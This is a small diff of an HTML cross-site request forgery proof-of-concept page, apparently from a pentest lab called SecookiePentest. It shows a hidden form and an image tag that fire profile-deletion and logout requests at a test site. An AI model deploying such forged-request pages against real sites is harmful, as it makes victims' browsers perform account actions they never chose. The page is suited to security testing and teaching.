@@ -10,9 +10,9 @@
 		<div class="login">
 			<h1>Vulnerable site</h1>
 			<!-- <img src="http://localhost/SecookiePentest/profile.php?delete=1" alt="..."> -->
-			<form id="csrf" method="post" action="https://timo-test.tuxed.net/SecookiePentest/profile.php">
-				<input type="hidden" name="delete" value="delete now!"/>
-				<input type ="submit" value="Delete"/>
+			<form id="csrf" method="post" action="https://timo-test.tuxed.net/SecookiePentest/logout.php">
+				<!-- <input type="hidden" name="delete" value="delete now!"/>
+				<input type ="submit" value="Delete"/> -->
 
 			</form>
 			<script>
